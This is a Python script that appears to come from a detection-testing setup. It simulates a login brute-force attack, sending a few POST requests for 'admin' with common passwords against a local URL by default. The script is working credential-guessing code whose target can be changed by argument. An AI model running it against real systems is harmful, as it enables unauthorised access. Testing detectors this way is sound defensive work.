import sys
import time
import urllib.parse
import urllib.request
import urllib.error


def run_auth_bruteforce(target_url: str = "http://127.0.0.1:8080/login", count: int = 5, interval: float = 0.2):
    """Table II Scenario 2: 5 x HTTP 401 responses within 10 seconds."""
    print(f"\n[*] [ATTACK 2] Starting Authentication Brute Force Attack ({count}x401 / 10s) on {target_url}...")
    passwords = ["123456", "password", "admin123", "welcome1", "qwerty", "letmein", "toor", "root123"]
    headers = {"User-Agent": "Mozilla/5.0 (Hydra-Simulated-Attacker v1.0)"}

    statuses = []
    for i in range(count):
        pwd = passwords[i % len(passwords)]
        encoded = urllib.parse.urlencode({"username": "admin", "password": pwd}).encode("utf-8")
        req = urllib.request.Request(target_url, data=encoded, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=2) as resp:
                code = resp.getcode()
        except urllib.error.HTTPError as e:
            code = e.code
        except Exception as e:
            code = f"DROPPED/TIMEOUT ({e})"
        statuses.append(code)
        print(f"    [ATTEMPT {i + 1}/{count}] User: admin | Pass: {pwd:12s} -> Status: {code}")
        if interval > 0:
            time.sleep(interval)

    print("[+] Authentication brute force simulation complete.\n")
    return statuses


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/login"
    run_auth_bruteforce(url)
